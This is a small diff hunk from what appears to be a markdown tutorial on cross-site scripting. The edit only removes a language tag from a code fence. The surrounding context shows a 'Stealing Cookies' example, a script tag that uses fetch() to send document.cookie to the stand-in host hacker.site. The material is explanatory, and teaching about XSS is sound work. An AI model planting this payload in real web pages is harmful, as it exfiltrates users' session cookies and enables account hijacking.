@@ -115,7 +115,7 @@ XSS attacks are executed using JavaScript code running in the user's browser. A 
 
 - **Stealing Cookies:**
 
-```auto
+```
 <script>fetch("https://hacker.site?data=" + document.cookie);</script>
 ```
 
